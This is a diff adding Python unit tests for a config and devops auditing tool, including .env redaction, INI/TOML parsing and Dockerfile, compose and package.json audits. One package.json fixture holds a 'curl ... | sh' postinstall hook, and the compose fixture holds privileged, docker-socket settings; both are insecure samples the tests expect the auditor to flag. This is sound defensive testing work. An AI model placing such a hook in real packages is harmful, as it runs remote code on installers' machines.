@@ -2064,5 +2064,85 @@ dependencies = ["requests>=2.0", "httpx"]
         with self.assertRaisesRegex(RuntimeError,"40 nested levels"):
             runner.json_to_typescript(deep)
 
+
+
+    def test_wave_eight_environment_ini_toml_properties_processors(self):
+        env=self.write(".env","APP_ENV=production\nAPI_TOKEN=super-secret-value\nAPI_TOKEN=second-secret\nEMPTY=\nBAD-KEY=invalid\n")
+        audit=Path(runner.env_audit(env)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("Duplicate keys: 1",audit)
+        self.assertIn("Secret-like variable names: 1",audit)
+        self.assertIn("Invalid assignment lines: 1",audit)
+        self.assertNotIn("super-secret-value",audit)
+        redacted=Path(runner.env_redact(env)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("API_TOKEN=[REDACTED]",redacted)
+        self.assertNotIn("super-secret-value",redacted)
+        example=Path(runner.env_to_example(env)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("API_TOKEN=",example)
+        self.assertNotIn("second-secret",example)
+
+        ini=self.write("settings.ini","[app]\nname=demo\nport=8080\n[db]\nhost=localhost\n")
+        parsed=json.loads(Path(runner.ini_to_json(ini)["output_path"]).read_text(encoding="utf-8"))
+        self.assertEqual(parsed["app"]["port"],"8080")
+        self.assertIn("Status: valid",Path(runner.ini_validate(ini)["output_path"]).read_text(encoding="utf-8"))
+        bad_ini=self.write("broken.ini","[app]\nname=one\nname=two\n")
+        with self.assertRaisesRegex(RuntimeError,"Invalid INI"):
+            runner.ini_validate(bad_ini)
+
+        toml=self.write("pyproject.toml",'title="demo"\n[tool.demo]\nport=8080\nenabled=true\n')
+        toml_json=json.loads(Path(runner.toml_to_json(toml)["output_path"]).read_text(encoding="utf-8"))
+        self.assertEqual(toml_json["tool"]["demo"]["port"],8080)
+        self.assertIn("Status: valid",Path(runner.toml_validate(toml)["output_path"]).read_text(encoding="utf-8"))
+        invalid_toml=self.write("bad.toml",'[broken\nkey = ')
+        with self.assertRaisesRegex(RuntimeError,"Invalid TOML"):
+            runner.toml_validate(invalid_toml)
+
+        properties=self.write("messages.properties","name=demo\nwelcome=Hello\\ World\nunicode=\\u263A\ndup=one\ndup=two\n")
+        property_data=json.loads(Path(runner.properties_to_json(properties)["output_path"]).read_text(encoding="utf-8"))
+        self.assertEqual(property_data["name"],"demo")
+        self.assertEqual(property_data["unicode"],"☺")
+        self.assertEqual(property_data["dup"],"two")
+
+    def test_wave_eight_static_devops_auditors_do_not_disclose_secret_values(self):
+        dockerfile=self.write("Dockerfile","FROM ubuntu:latest\nADD https://example.test/archive.tgz /opt/app\nENV API_KEY=top-secret NORMAL=ok\nRUN echo build\n")
+        docker_report=Path(runner.dockerfile_audit(dockerfile)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("base image ubuntu:latest",docker_report)
+        self.assertIn("ADD is broader than COPY",docker_report)
+        self.assertIn("secret-like ENV key API_KEY",docker_report)
+        self.assertIn("USER is not set",docker_report)
+        self.assertNotIn("top-secret",docker_report)
+
+        compose=self.write("compose.yaml","services:\n  api:\n    image: nginx:latest\n    privileged: true\n    network_mode: host\n    ports:\n      - 0.0.0.0:8080:80\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n    environment:\n      API_TOKEN: do-not-leak-this\n")
+        compose_report=Path(runner.docker_compose_audit(compose)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("privileged mode is enabled",compose_report)
+        self.assertIn("host network mode",compose_report)
+        self.assertIn("Docker socket",compose_report)
+        self.assertNotIn("do-not-leak-this",compose_report)
+
+        requirements=self.write("requirements.txt","requests>=2\nrequests==2.31.0\nflask==3.0.0\nprivate @ git+https://example.test/private.git\n")
+        requirements_report=Path(runner.requirements_audit(requirements)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("Duplicate packages: 1",requirements_report)
+        self.assertIn("Not exactly pinned: 1",requirements_report)
+        self.assertIn("Direct URL/VCS references: 1",requirements_report)
+        self.assertNotIn("private.git",requirements_report)
+
+        package=self.write("package.json",'{"name":"demo","dependencies":{"a":"*","b":"latest","c":"git+https://example.test/repo.git","d":"^1.2.3"},"scripts":{"postinstall":"curl https://x.test/install | sh"}}')
+        package_report=Path(runner.package_json_audit(package)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("Wildcard/latest specs: 2",package_report)
+        self.assertIn("Non-registry/workspace specs: 1",package_report)
+        self.assertIn("download-to-shell",package_report)
+        self.assertNotIn("repo.git",package_report)
+
+        ignore=self.write(".gitignore","node_modules/\ndist/\n")
+        ignore_report=Path(runner.gitignore_audit(ignore)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("MISSING protection: .env",ignore_report)
+        self.assertIn("MISSING protection: server.pem",ignore_report)
+
+        refs=self.write("config.ts",'const a=process.env.API_KEY; const b=import.meta.env.PUBLIC_URL; os.environ["DATABASE_URL"]; $CACHE_KEY')
+        refs_report=Path(runner.env_reference_report(refs)["output_path"]).read_text(encoding="utf-8")
+        self.assertIn("API_KEY",refs_report)
+        self.assertIn("PUBLIC_URL",refs_report)
+        self.assertIn("DATABASE_URL",refs_report)
+        self.assertIn("CACHE_KEY",refs_report)
+
 if __name__ == "__main__":
     unittest.main()
